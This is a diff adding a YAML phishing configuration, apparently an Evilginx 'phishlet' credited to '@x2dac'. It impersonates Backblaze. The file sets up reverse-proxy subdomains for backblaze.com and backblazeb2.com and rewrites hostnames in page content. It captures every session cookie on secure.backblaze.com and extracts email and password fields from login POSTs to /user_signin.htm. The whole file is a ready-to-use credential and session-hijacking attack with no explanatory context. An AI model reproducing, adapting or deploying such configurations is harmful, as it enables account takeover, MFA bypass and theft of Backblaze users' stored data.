@@ -1,0 +1,48 @@
+author: '@x2dac'
+min_ver: '2.3.0'
+
+proxy_hosts:
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'backblaze.com', session: true, is_landing: false}
+  - {phish_sub: 'secure', orig_sub: 'secure', domain: 'backblaze.com', session: true, is_landing: true}
+  - {phish_sub: 'api', orig_sub: 'api', domain: 'backblazeb2.com', session: false, is_landing: false}
+  - {phish_sub: 'api001', orig_sub: 'api001', domain: 'backblazeb2.com', session: false, is_landing: false}
+  - {phish_sub: 'api002', orig_sub: 'api002', domain: 'backblazeb2.com', session: false, is_landing: false}
+  - {phish_sub: 'api003', orig_sub: 'api003', domain: 'backblazeb2.com', session: false, is_landing: false}
+  - {phish_sub: 'api004', orig_sub: 'api004', domain: 'backblazeb2.com', session: false, is_landing: false}
+  - {phish_sub: 'api005', orig_sub: 'api005', domain: 'backblazeb2.com', session: false, is_landing: false}
+  
+  
+sub_filters:
+  - {triggers_on: 'www.backblaze.com', orig_sub: 'www', domain: 'backblaze.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'secure.backblaze.com', orig_sub: 'secure', domain: 'backblaze.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'api.backblazeb2.com', orig_sub: 'api', domain: 'backblazeb2.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'api001.backblazeb2.com', orig_sub: 'api001', domain: 'backblazeb2.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'api002.backblazeb2.com', orig_sub: 'api002', domain: 'backblazeb2.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'api003.backblazeb2.com', orig_sub: 'api003', domain: 'backblazeb2.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'api004.backblazeb2.com', orig_sub: 'api004', domain: 'backblazeb2.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'api005.backblazeb2.com', orig_sub: 'api005', domain: 'backblazeb2.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+
+
+auth_tokens:
+ - domain: '.secure.backblaze.com'
+   keys: ['.*,regexp']
+ - domain: 'secure.backblaze.com'
+   keys: ['.*,regexp']
+    
+auth_urls:
+  - 'user_overview.htm'
+
+
+credentials:
+  username:
+    key: 'email'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+    
+login: 
+  domain: 'secure.backblaze.com'
+  path: '/user_signin.htm'
